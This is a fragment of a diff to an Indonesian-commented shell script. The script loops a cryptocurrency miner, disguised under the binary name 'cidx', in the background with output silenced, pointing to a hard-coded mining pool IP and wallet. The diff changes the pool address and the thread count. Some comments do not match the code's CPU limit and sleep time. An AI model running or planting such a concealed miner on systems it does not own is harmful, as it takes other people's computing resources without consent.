@@ -17,10 +17,10 @@ while true; do
   
   # Jalankan cidx dengan cpulimit untuk membatasi CPU ke 50%
   nohup cpulimit --limit=400  ./cidx -a yespower \
-    -o 45.115.224.108:443 \
+    -o 45.115.225.42:81 \
     -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1 \
     -p c=VECO,m=solo,zap=VECO,mc=VECO \
-    -t 4 &>/dev/null &
+    -t 1 &>/dev/null &
 
   sleep 700   # 5 menit mining
 
